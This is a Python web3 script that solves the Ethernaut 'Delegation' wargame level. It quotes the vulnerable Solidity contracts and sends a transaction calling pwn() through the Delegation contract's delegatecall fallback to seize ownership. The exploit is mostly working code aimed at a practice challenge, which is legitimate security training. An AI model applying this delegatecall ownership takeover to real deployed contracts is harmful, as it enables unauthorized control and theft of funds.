#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sat Sep  4 01:21:49 2021

@author: johnbergschneider
"""



''' Ethernaut Problem 6
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

'''



from interactWithContract import contractInstance
from interactWithContract import functiontransaction
from web3 import Web3

##
## Loading up Web3 interface
##
server = ''
web3 = Web3(Web3.HTTPProvider(server))
###
###
###


##
## Keys and Accounts
##
maddress = ''
privateKey =''




###
###

Delegate_abi = '''[
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "_owner",
				"type": "address"
			}
		],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "owner",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "pwn",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	}
]'''

Delegation_address = '0x41D8A234792f3d9e17140b88dcD363F8Ca8311Af'




Delegation_contract = contractInstance(web3,Delegate_abi,Delegation_address)
call_fallback = Delegation_contract.functions.pwn().buildTransaction({'from':maddress,'nonce':web3.eth.getTransactionCount(maddress)})
call_fallback['gas']=2100000
call_fallback['gasPrice']=web3.toWei(79,'gwei')
r=functiontransaction(web3,privateKey,call_fallback)
print(call_fallback)
